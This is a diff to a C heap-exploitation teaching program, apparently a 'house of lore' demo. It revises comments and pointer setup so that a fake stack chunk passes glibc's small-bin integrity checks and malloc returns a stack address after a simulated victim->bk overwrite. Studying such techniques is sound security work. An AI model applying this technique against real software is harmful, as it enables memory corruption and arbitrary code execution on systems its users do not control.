@@ -48,14 +48,16 @@ int main(int argc, char * argv[]){
   printf("stack_buffer_2 at %p\n", (void*)stack_buffer_2);
 
   printf("Create a fake chunk on the stack");
-  printf("Set the fwd pointer to the victim_chunk and the bk pointer to stack_buffer_2\n");
+  printf("Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
+         "in second to the last malloc, which putting stack address on smallbin list\n");
   stack_buffer_1[0] = 0;
   stack_buffer_1[1] = 0;
   stack_buffer_1[2] = victim_chunk;
-  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
 
-  printf("stack_buffer_2 needs its fwd pointer to point to stack_buffer_1\n");
-  printf("this will let us bypass the bck = victim->bk check\n");
+  printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
+         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
+         "chunk on stack");
+  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
   
   printf("Allocating another large chunk in order to avoid consolidating the top chunk with"
@@ -83,9 +85,8 @@ int main(int argc, char * argv[]){
 
   //------------VULNERABILITY-----------
 
-  printf("Now emulating a vulnerability that can overwrite the victim->fd and victim->bk pointers\n");
+  printf("Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
 
-  victim[0] = (intptr_t)victim_chunk; //victim->fd point to victim in order to pass the check of small bin corrupted
   victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
 
   //------------------------------------
